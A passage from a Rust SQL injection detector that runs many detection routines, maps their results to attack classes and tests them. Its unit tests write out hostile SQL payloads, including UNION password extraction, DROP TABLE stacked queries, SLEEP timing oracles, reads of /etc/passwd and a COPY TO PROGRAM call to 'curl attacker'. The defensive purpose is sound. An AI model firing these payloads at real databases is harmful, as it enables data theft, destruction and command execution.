                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_stacked_execution(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_semicolon_normalized_stacked(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_time_oracle(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mysql_if_sleep_subquery(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_postgres_cast_pg_sleep_chain(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mysql_select_if_sleep_subquery(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_semicolon_whitespace_stacked_variant(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_error_oracle(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_comment_truncation(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_file_exec_primitives(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_catalog_exfiltration(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_case_time_oracle(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_scientific_union_bypass(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_hex_encoded_keywords(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_backtick_tautology(variant, &tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_dollar_quoted_stacked(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mssql_bracket_exfiltration(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mysql_versioned_comment_payload(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_order_by_time_oracle(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_window_exfiltration(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_json_extraction_abuse(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_order_by_injection(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_having_injection(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_group_by_injection(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_subquery_injection(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_second_order_injection(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_xml_abuse(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_cte_injection(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_db_specific_primitives(&tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_waf_bypass_alternative_whitespace(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_postgres_escape_string_keywords(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mysql_binary_literal_identifiers(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_oracle_q_quote_keyword_strings(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mssql_bracketed_identifier_abuse(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_mysql_pipe_concatenation_bypass(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_unicode_normalization_sqli(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_unicode_smuggling(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_scientific_tautology(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_backtick_keyword_bypass(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_multiline_comment_keyword_split(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_hex_unicode_function_abuse(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_numeric_dollar_quoted_payload(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_like_wildcard_injection(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_dbms_stacked_variant_payloads(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_boolean_blind_extraction(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_boolean_blind_subquery(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_error_based_extraction_advanced(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_json_where_operator_abuse(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_insert_update_manipulation(variant, &tokens) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_pg_copy_from_program(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_zero_width_bypass(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_pg_unicode_escape(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_bitwise_tautology(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_hex_x_literal(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
            for det in self.detect_sqlite_pragma(variant) {
                let key = format!("{}:{}", det.detection_type, det.detail);
                if seen.insert(key) {
                    all_detections.push(det);
                }
            }
        }

        let err_score = detect_error_based_sqli(input);
        if err_score > 0.5 {
            all_detections.push(L2Detection {
                detection_type: "error_based_sqli".into(),
                confidence: err_score,
                detail: "Error-based SQL injection pattern detected via specific functions".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: input.to_owned(),
                    interpretation: "Input triggers error-based SQL injection evaluation".into(),
                    offset: 0,
                    property: "User input must not trigger error-based SQL evaluation".into(),
                }],
            });
        }

        let sec_score = detect_second_order_sqli(input);
        if sec_score > 0.5 {
            all_detections.push(L2Detection {
                detection_type: "second_order_sqli".into(),
                confidence: sec_score,
                detail: "Second-order SQL injection profile/username payload detected".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: input.to_owned(),
                    interpretation: "Input stores payload for second-order SQL injection".into(),
                    offset: 0,
                    property: "User input must not store payloads for delayed SQL evaluation"
                        .into(),
                }],
            });
        }

        all_detections
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "string_termination" => Some(InvariantClass::SqlStringTermination),
            "union_extraction" => Some(InvariantClass::SqlUnionExtraction),
            "stacked_execution" => Some(InvariantClass::SqlStackedExecution),
            "stacked_execution_normalized" => Some(InvariantClass::SqlStackedExecution),
            "stacked_execution_semicolon_ws" => Some(InvariantClass::SqlStackedExecution),
            "time_oracle" => Some(InvariantClass::SqlTimeOracle),
            "mysql_if_sleep_time_oracle" => Some(InvariantClass::SqlTimeOracle),
            "mysql_select_if_sleep_subquery" => Some(InvariantClass::SqlTimeOracle),
            "case_time_oracle" => Some(InvariantClass::SqlTimeOracle),
            "postgres_cast_pg_sleep_oracle" => Some(InvariantClass::SqlErrorOracle),
            "error_oracle" => Some(InvariantClass::SqlErrorOracle),
            "comment_truncation" => Some(InvariantClass::SqlCommentTruncation),
            "file_exec_primitive" => Some(InvariantClass::SqlStackedExecution),
            "catalog_exfiltration" => Some(InvariantClass::SqlUnionExtraction),
            "scientific_union" => Some(InvariantClass::SqlUnionExtraction),
            "hex_keyword_encoding" => Some(InvariantClass::SqlUnionExtraction),
            "backtick_tautology" => Some(InvariantClass::SqlTautology),
            "dollar_quote_stacked" => Some(InvariantClass::SqlStackedExecution),
            "mssql_bracket_exfiltration" => Some(InvariantClass::SqlUnionExtraction),
            "mysql_versioned_comment" => Some(InvariantClass::SqlUnionExtraction),
            "order_by_time_oracle" => Some(InvariantClass::SqlTimeOracle),
            "window_exfiltration" => Some(InvariantClass::SqlUnionExtraction),
            "json_extraction" => Some(InvariantClass::SqlUnionExtraction),
            "order_by_injection" => Some(InvariantClass::SqlUnionExtraction),
            "having_injection" => Some(InvariantClass::SqlTautology),
            "group_by_injection" => Some(InvariantClass::SqlUnionExtraction),
            "subquery_injection" => Some(InvariantClass::SqlUnionExtraction),
            "second_order_injection" => Some(InvariantClass::SqlUnionExtraction),
            "error_based_sqli" => Some(InvariantClass::SqlErrorOracle),
            "second_order_sqli" => Some(InvariantClass::SqlUnionExtraction),
            "xml_abuse" => Some(InvariantClass::SqlErrorOracle),
            "cte_injection" => Some(InvariantClass::SqlUnionExtraction),
            "db_specific_primitive" => Some(InvariantClass::SqlStackedExecution),
            "alt_whitespace_bypass" => Some(InvariantClass::SqlStringTermination),
            "postgres_escape_keyword" => Some(InvariantClass::SqlUnionExtraction),
            "mysql_binary_literal" => Some(InvariantClass::SqlUnionExtraction),
            "oracle_q_quote_keyword" => Some(InvariantClass::SqlUnionExtraction),
            "mssql_bracket_identifier_abuse" => Some(InvariantClass::SqlUnionExtraction),
            "mysql_pipe_concat_bypass" => Some(InvariantClass::SqlUnionExtraction),
            "unicode_normalization_sqli" => Some(InvariantClass::SqlStringTermination),
            "unicode_smuggling" => Some(InvariantClass::SqlStringTermination),
            "scientific_tautology" => Some(InvariantClass::SqlTautology),
            "backtick_keyword_bypass" => Some(InvariantClass::SqlUnionExtraction),
            "comment_keyword_split" => Some(InvariantClass::SqlUnionExtraction),
            "hex_unicode_function" => Some(InvariantClass::SqlUnionExtraction),
            "numeric_dollar_quote" => Some(InvariantClass::SqlStackedExecution),
            "like_wildcard_injection" => Some(InvariantClass::SqlTautology),
            "dbms_stacked_variant" => Some(InvariantClass::SqlStackedExecution),
            "sql_boolean_blind_extraction" => Some(InvariantClass::SqlTautology),
            "boolean_blind_subquery" => Some(InvariantClass::SqlTautology),
            "advanced_error_oracle" => Some(InvariantClass::SqlErrorOracle),
            "json_where_abuse" => Some(InvariantClass::SqlUnionExtraction),
            "insert_update_injection" => Some(InvariantClass::SqlStackedExecution),
            "sql_pg_copy_from_program" => Some(InvariantClass::SqlStackedExecution),
            "sql_zero_width_bypass" => Some(InvariantClass::SqlUnionExtraction),
            "sql_pg_unicode_escape" => Some(InvariantClass::SqlUnionExtraction),
            "sql_bitwise_tautology" => Some(InvariantClass::SqlTautology),
            "sql_hex_x_literal" => Some(InvariantClass::SqlUnionExtraction),
            "sql_sqlite_pragma" => Some(InvariantClass::SqlStackedExecution),
            _ => None,
        }
    }
}

// ── Helpers ─────────────────────────────────────────────────────

fn strip_injection_prefix(input: &str) -> Vec<std::string::String> {
    let mut variants = vec![input.to_owned()];
    let patterns = [
        Regex::new(r"^'+\)?\s*").unwrap(),
        Regex::new(r#"^"+\)?\s*"#).unwrap(),
        Regex::new(r"^\)+\s*").unwrap(),
        Regex::new(r#"^['"]?\)\s*"#).unwrap(),
    ];
    for pat in &patterns {
        if pat.is_match(input) {
            let stripped = pat.replace(input, "").to_string();
            if stripped != input && !stripped.is_empty() {
                variants.push(stripped);
            }
        }
    }
    variants
}

fn extract_context(input: &str, pos: usize, max_len: usize) -> std::string::String {
    let end = (pos + max_len).min(input.len());
    input.get(pos..end).unwrap_or("").to_owned()
}

pub fn detect_error_based_sqli(input: &str) -> f64 {
    let mut max_score: f64 = 0.0;
    static RE_EXTRACTVALUE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r"(?is)extractvalue\s*\(\s*1\s*,\s*[^)]+\)").unwrap()
    });
    static RE_UPDATEXML: std::sync::LazyLock<Regex> =
        std::sync::LazyLock::new(|| Regex::new(r"(?is)updatexml\s*\(\s*1\s*,\s*[^)]+\)").unwrap());
    static RE_EXP: std::sync::LazyLock<Regex> =
        std::sync::LazyLock::new(|| Regex::new(r"(?is)exp\s*\(\s*~\s*\(\s*select\b").unwrap());
    static RE_GEOMETRIC: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r"(?is)(?:polygon|multipoint)\s*\(\s*\(\s*select\b").unwrap()
    });
    static RE_FLOOR_RAND: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r"(?is)floor\s*\(\s*rand\s*\(\s*0\s*\)\s*\*\s*2\s*\).*?group\s+by").unwrap()
    });

    if RE_EXTRACTVALUE.is_match(input) {
        max_score = max_score.max(0.92);
    }
    if RE_UPDATEXML.is_match(input) {
        max_score = max_score.max(0.92);
    }
    if RE_EXP.is_match(input) {
        max_score = max_score.max(0.90);
    }
    if RE_GEOMETRIC.is_match(input) {
        max_score = max_score.max(0.88);
    }
    if RE_FLOOR_RAND.is_match(input) {
        max_score = max_score.max(0.91);
    }

    max_score
}

pub fn detect_second_order_sqli(input: &str) -> f64 {
    let mut max_score: f64 = 0.0;
    static RE_REG_PROFILE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(
            r"(?is)(?:username|email|profile|name)=[^&]*'(?:\s*OR\s*'1'='1|\s*UNION\s+SELECT|--@)",
        )
        .unwrap()
    });
    static RE_JSON_USERNAME: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
        Regex::new(r#"(?is)"(?:username|email|name)"\s*:\s*"[^"]*'(?:\s*OR\s*'1'='1|\s*UNION\s+SELECT|--@)"#).unwrap()
    });

    if RE_REG_PROFILE.is_match(input) || RE_JSON_USERNAME.is_match(input) {
        max_score = max_score.max(0.90);
    }

    max_score
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tautology_1_eq_1() {
        let eval = SqlTautologyEvaluator;
        let dets = eval.detect("' OR 1=1--");
        assert!(!dets.is_empty(), "Should detect tautology in ' OR 1=1--");
    }

    #[test]
    fn union_select() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' UNION SELECT username, password FROM users--");
        assert!(
            dets.iter().any(|d| d.detection_type == "union_extraction"),
            "Should detect UNION SELECT, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn stacked_query() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("'; DROP TABLE users--");
        assert!(
            dets.iter().any(|d| d.detection_type == "stacked_execution"),
            "Should detect stacked execution, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn time_oracle_sleep() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' OR SLEEP(5)--");
        assert!(
            dets.iter().any(|d| d.detection_type == "time_oracle"),
            "Should detect SLEEP time oracle, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn mysql_if_sleep_subquery_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1 OR IF(1=1,SLEEP(5),0)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "mysql_if_sleep_time_oracle"),
            "Should detect IF(...,SLEEP(...),0) time payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn postgres_cast_pg_sleep_boolean_chain() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1::int=1 AND (SELECT pg_sleep(5)) IS NOT NULL");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "postgres_cast_pg_sleep_oracle"),
            "Should detect postgres cast+pg_sleep chain, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn stacked_query_semicolon_with_normalization() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1/**/; \n\t/**/DROP/**/TABLE users");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "stacked_execution_normalized"),
            "Should detect normalized semicolon-stacked query, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn mysql_select_if_sleep_subquery_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("AND (SELECT IF(1=1,SLEEP(5),0))");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "mysql_select_if_sleep_subquery"),
            "Should detect SELECT IF(...SLEEP...) subquery payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn stacked_query_semicolon_comment_whitespace_variant() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1;/**/ \n DROP TABLE audit_log");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "stacked_execution_semicolon_ws"),
            "Should detect semicolon+comment stacked execution variant, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn comment_truncation() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' OR 1=1--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "comment_truncation"),
            "Should detect comment truncation, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn class_mapping() {
        let eval = SqlStructuralEvaluator;
        assert_eq!(
            eval.map_class("string_termination"),
            Some(InvariantClass::SqlStringTermination)
        );
        assert_eq!(
            eval.map_class("union_extraction"),
            Some(InvariantClass::SqlUnionExtraction)
        );
        assert_eq!(
            eval.map_class("file_exec_primitive"),
            Some(InvariantClass::SqlStackedExecution)
        );
        assert_eq!(eval.map_class("nonexistent"), None);
    }

    #[test]
    fn detect_into_outfile_primitive() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' UNION SELECT user,pass INTO OUTFILE '/tmp/pwned' FROM users--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "file_exec_primitive"),
            "Should detect INTO OUTFILE primitive, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_copy_program_primitive() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("'; COPY users TO PROGRAM 'curl attacker'--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "file_exec_primitive"),
            "Should detect COPY TO PROGRAM primitive, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_catalog_enumeration() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' UNION SELECT table_name FROM information_schema.tables--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "catalog_exfiltration"),
            "Should detect system catalog exfiltration, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_case_timing_oracle() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("' OR CASE WHEN (1=1) THEN PG_SLEEP_FOR(5) ELSE 0 END--");
        assert!(
            dets.iter().any(|d| d.detection_type == "case_time_oracle"),
            "Should detect CASE timing oracle, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_comment_stuffed_union_select() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("UN/**/ION/**/SEL/**/ECT username,password FROM users");
        assert!(
            dets.iter().any(|d| d.detection_type == "union_extraction"),
            "Should detect comment-stuffed UNION SELECT, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_chr_concat_keyword_construction() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("chr(85)||chr(78)||chr(73)||chr(79)||chr(78)||chr(32)||chr(83)||chr(69)||chr(76)||chr(69)||chr(67)||chr(84)");
        assert!(
            dets.iter().any(|d| d.detection_type == "union_extraction"),
            "Should detect CHR-concatenated UNION SELECT construction, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_scientific_notation_union_bypass() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("1e0UNION SELECT username,password FROM users");
        assert!(
            dets.iter().any(|d| d.detection_type == "scientific_union"),
            "Should detect scientific-notation UNION bypass, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_hex_encoded_keyword_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT 0x756E696F6E2053454C454354");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "hex_keyword_encoding"),
            "Should detect hex-encoded SQL keyword payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_mysql_backtick_tautology_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("select * from `users` where `id`=1 or 1=1");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "backtick_tautology"),
            "Should detect backtick tautology injection, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_postgres_dollar_quoted_stacked_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("$$; DROP TABLE users;$$");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dollar_quote_stacked"),
            "Should detect dollar-quoted stacked payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_mssql_square_bracket_catalog_path() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT * FROM [master]..[sysobjects]");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "mssql_bracket_exfiltration"),
            "Should detect MSSQL bracket catalog abuse, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_mysql_versioned_comment_union_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("/*!50000UNION*/ SELECT user, password FROM users");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "mysql_versioned_comment"),
            "Should detect MySQL versioned comment payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_order_by_blind_timing_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ORDER BY 1,(SELECT 1 FROM users WHERE SLEEP(5))");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "order_by_time_oracle"),
            "Should detect ORDER BY blind timing payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_window_function_sensitive_ordering() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT ROW_NUMBER() OVER (ORDER BY password) FROM users");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "window_exfiltration"),
            "Should detect window-function sensitive ordering, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_json_extract_sensitive_key() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT json_extract(data, '$.password') FROM users");
        assert!(
            dets.iter().any(|d| d.detection_type == "json_extraction"),
            "Should detect JSON_EXTRACT sensitive-key exfil, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_json_arrow_sensitive_key() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT data->>'password' FROM users");
        assert!(
            dets.iter().any(|d| d.detection_type == "json_extraction"),
            "Should detect JSON arrow sensitive-key exfil, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_tagged_dollar_quote_stacked_payload() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("$inj$; TRUNCATE TABLE audit_log;$inj$");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "dollar_quote_stacked"),
            "Should detect tagged dollar-quoted stacked payload, got: {:?}",
            dets.iter().map(|d| &d.detection_type).collect::<Vec<_>>()
        );
    }

    #[test]
    fn detect_order_by_numeric_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ORDER BY 1--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "order_by_injection")
        );
    }

    #[test]
    fn detect_order_by_sleep_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ORDER BY SLEEP(5)--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "order_by_injection")
        );
    }

    #[test]
    fn detect_order_by_subquery_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("ORDER BY (SELECT password FROM users)--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "order_by_injection")
        );
    }

    #[test]
    fn detect_having_clause_tautology() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("HAVING 1=1--");
        assert!(dets.iter().any(|d| d.detection_type == "having_injection"));
    }

    #[test]
    fn detect_group_by_numeric_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("GROUP BY 1--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "group_by_injection")
        );
    }

    #[test]
    fn detect_subquery_injection_standalone() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("(SELECT password FROM users)");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "subquery_injection")
        );
    }

    #[test]
    fn detect_second_order_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("'||(SELECT password FROM users)||'");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "second_order_injection")
        );
    }

    #[test]
    fn detect_xml_function_abuse() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT XMLTYPE('<x/>') FROM dual");
        assert!(dets.iter().any(|d| d.detection_type == "xml_abuse"));
    }

    #[test]
    fn detect_cte_injection() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("WITH cte AS (SELECT * FROM users) SELECT * FROM cte--");
        assert!(dets.iter().any(|d| d.detection_type == "cte_injection"));
    }

    #[test]
    fn detect_postgres_lo_import() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("SELECT lo_import('/etc/passwd')--");
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "db_specific_primitive")
        );
    }

    #[test]
    fn detect_mysql_load_data_infile() {
        let eval = SqlStructuralEvaluator;
        let dets = eval.detect("LOAD DATA INFILE '/etc/passwd' INTO TABLE users--");
        assert!(
